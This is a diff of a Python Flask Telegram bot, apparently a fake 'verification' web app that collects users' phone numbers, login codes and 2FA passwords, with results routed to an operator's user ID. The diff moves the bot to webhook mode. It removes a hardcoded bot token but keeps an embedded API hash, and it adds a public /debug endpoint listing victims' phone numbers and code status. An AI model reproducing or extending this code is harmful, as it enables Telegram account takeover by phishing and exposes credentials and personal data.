@@ -12,25 +12,38 @@ import time
 import threading
 import uuid
 import logging
+import sys
 
 # Setup logging
-logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    stream=sys.stdout
+)
 logger = logging.getLogger(__name__)
 
 # Initialize Flask
 app = Flask(__name__)
 
-# Configuration
-BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
-USER_ID = int(os.environ.get('USER_ID', '5425526761'))
-API_ID = int(os.environ.get('API_ID', '25240346'))
+# Configuration - GET FROM ENVIRONMENT VARIABLES
+BOT_TOKEN = os.environ.get('BOT_TOKEN')
+USER_ID = os.environ.get('USER_ID')
+API_ID = os.environ.get('API_ID', '25240346')
 API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
-WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '')
+WEBHOOK_URL = os.environ.get('WEBHOOK_URL')  # REQUIRED for webhook
+PORT = int(os.environ.get('PORT', 5000))
 
-# Debug info
-logger.info(f"Bot Token: {BOT_TOKEN[:8]}...")
-logger.info(f"User ID: {USER_ID}")
-logger.info(f"Webhook URL: {WEBHOOK_URL}")
+# Validate configuration
+if not BOT_TOKEN:
+    logger.error("❌ BOT_TOKEN is not set in environment variables!")
+    exit(1)
+
+if not USER_ID:
+    logger.error("❌ USER_ID is not set in environment variables!")
+    exit(1)
+
+if not WEBHOOK_URL:
+    logger.warning("⚠️ WEBHOOK_URL is not set. Bot will use polling mode.")
 
 # Initialize bot
 try:
@@ -446,7 +459,7 @@ def verify_2fa():
 def handle_start_help(message):
     """Handle /start and /help commands"""
     try:
-        logger.info(f"Received /start or /help from user_id: {message.from_user.id}")
+        logger.info(f"📨 Received /start or /help from user_id: {message.from_user.id}")
         
         # Create WebApp URL
         webapp_url = WEBHOOK_URL.rstrip('/') if WEBHOOK_URL else f"https://{request.host}"
@@ -470,10 +483,6 @@ def handle_start_help(message):
         
     except Exception as e:
         logger.error(f"❌ Error in handle_start_help: {e}")
-        try:
-            bot.send_message(message.chat.id, f"Error: {str(e)}")
-        except:
-            pass
 
 @bot.message_handler(content_types=['contact'])
 def handle_contact(message):
@@ -601,36 +610,53 @@ def handle_contact(message):
 
 # ==================== WEBHOOK SETUP ====================
 def setup_webhook():
-    """Set up webhook for Render"""
+    """Set up webhook for Telegram"""
     try:
         if WEBHOOK_URL:
-            logger.info(f"Setting up webhook for URL: {WEBHOOK_URL}")
+            # Remove existing webhook
             bot.remove_webhook()
             time.sleep(2)
-            webhook_url = f"{WEBHOOK_URL.rstrip('/')}/bot/{BOT_TOKEN}"
-            bot.set_webhook(url=webhook_url)
-            logger.info(f"✅ Webhook set: {webhook_url}")
+            
+            # Set new webhook
+            webhook_url = f"{WEBHOOK_URL.rstrip('/')}/webhook"
+            bot.set_webhook(url=webhook_url, max_connections=50)
+            
+            logger.info(f"✅ Webhook set successfully: {webhook_url}")
+            
+            # Test webhook
+            try:
+                bot_info = bot.get_me()
+                logger.info(f"🤖 Bot info: @{bot_info.username} ({bot_info.id})")
+                
+                webhook_info = bot.get_webhook_info()
+                logger.info(f"🌐 Webhook info: {webhook_info.url}")
+                logger.info(f"📊 Webhook pending updates: {webhook_info.pending_update_count}")
+            except Exception as e:
+                logger.error(f"❌ Error getting bot info: {e}")
+                
             return True
         else:
-            logger.warning("⚠️ No WEBHOOK_URL set, using polling")
+            logger.warning("⚠️ WEBHOOK_URL not set, webhook not configured")
             return False
     except Exception as e:
-        logger.error(f"❌ Webhook error: {e}")
+        logger.error(f"❌ Webhook setup error: {e}")
         return False
 
-@app.route(f'/bot/{BOT_TOKEN}', methods=['POST'])
+@app.route('/webhook', methods=['POST'])
 def webhook():
     """Handle Telegram webhook"""
     try:
         logger.info("Received webhook request")
         if request.headers.get('content-type') == 'application/json':
             json_string = request.get_data().decode('utf-8')
-            update = types.Update.de_json(json_string)
+            update = telebot.types.Update.de_json(json_string)
             bot.process_new_updates([update])
+            logger.info("✅ Webhook processed successfully")
             return 'OK', 200
+        logger.warning("Invalid content-type")
         return 'Bad Request', 400
     except Exception as e:
-        logger.error(f"Webhook error: {e}")
+        logger.error(f"❌ Webhook processing error: {e}")
         return 'Internal Server Error', 500
 
 @app.route('/health')
@@ -640,16 +666,28 @@ def health_check():
         'status': 'ok',
         'timestamp': datetime.now().isoformat(),
         'sessions_count': len(user_sessions),
-        'bot_ready': True
+        'bot_ready': True,
+        'webhook_url': WEBHOOK_URL,
+        'port': PORT
     })
 
 @app.route('/debug')
 def debug_info():
     """Debug endpoint"""
+    sessions_info = {}
+    for user_id, session in user_sessions.items():
+        sessions_info[user_id] = {
+            'phone': session.get('phone'),
+            'otp_sent': session.get('otp_sent', False),
+            'status': session.get('status'),
+            'expiry': session['expiry'].isoformat() if 'expiry' in session else None
+        }
+    
     return jsonify({
-        'user_sessions': list(user_sessions.keys()),
+        'user_sessions': sessions_info,
         'sessions_count': len(user_sessions),
-        'timestamp': datetime.now().isoformat()
+        'timestamp': datetime.now().isoformat(),
+        'webhook_url': WEBHOOK_URL
     })
 
 # ==================== CLEANUP THREAD ====================
@@ -671,45 +709,28 @@ def cleanup_loop():
         if expired_users:
             logger.info(f"🧹 Cleanup: Removed {len(expired_users)} expired sessions")
 
-# ==================== POLLING FALLBACK ====================
-def run_bot_polling():
-    """Run bot in polling mode"""
-    try:
-        logger.info("Starting bot polling...")
-        bot.infinity_polling(timeout=30, long_polling_timeout=5)
-    except Exception as e:
-        logger.error(f"Bot polling error: {e}")
-        time.sleep(5)
-        run_bot_polling()
-
 # ==================== MAIN ====================
 if __name__ == '__main__':
     logger.info("="*60)
-    logger.info("🚀 Telegram WebApp Verification Bot - DEBUG MODE")
+    logger.info("🚀 Telegram WebApp Verification Bot - WEBHOOK MODE")
     logger.info("="*60)
     logger.info(f"🤖 Bot Token: {BOT_TOKEN[:8]}...")
     logger.info(f"👤 User ID: {USER_ID}")
     logger.info(f"🔧 API ID: {API_ID}")
-    logger.info(f"🌐 WebApp URL: {WEBHOOK_URL}")
+    logger.info(f"🌐 Webhook URL: {WEBHOOK_URL}")
+    logger.info(f"🚪 Port: {PORT}")
     
     # Start cleanup thread
     cleanup_thread = threading.Thread(target=cleanup_loop, daemon=True)
     cleanup_thread.start()
     logger.info("✅ Cleanup thread started")
     
-    # Set up webhook or polling
-    port = int(os.environ.get('PORT', 5000))
-    
-    # Always start bot in polling mode initially for debugging
-    logger.info("🤖 Starting bot in polling mode for debugging...")
-    bot_thread = threading.Thread(target=run_bot_polling, daemon=True)
-    bot_thread.start()
-    time.sleep(3)  # Give bot time to start
-    
-    # If we have a webhook URL, also set it up
+    # Setup webhook
     if WEBHOOK_URL:
         setup_webhook()
+    else:
+        logger.warning("⚠️ Running without webhook. Bot will not receive messages!")
     
     # Run Flask
-    logger.info(f"🌐 Starting Flask server on port {port}")
-    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=True)
+    logger.info(f"🌐 Starting Flask server on port {PORT}")
+    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False, threaded=True)
